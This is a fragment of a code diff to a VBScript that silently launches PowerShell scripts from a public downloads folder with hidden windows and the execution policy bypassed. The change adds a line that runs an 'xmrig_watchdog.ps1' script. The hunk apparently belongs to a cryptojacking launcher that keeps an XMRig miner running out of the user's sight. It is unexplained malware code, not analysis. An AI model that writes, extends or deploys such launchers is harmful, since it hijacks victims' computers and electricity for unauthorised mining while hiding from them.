@@ -32,4 +32,5 @@ objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
 WScript.Sleep 20000
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\xmrig_watchdog.ps1", 0, True
 objShell.Run "powershell.exe exit", 0, False
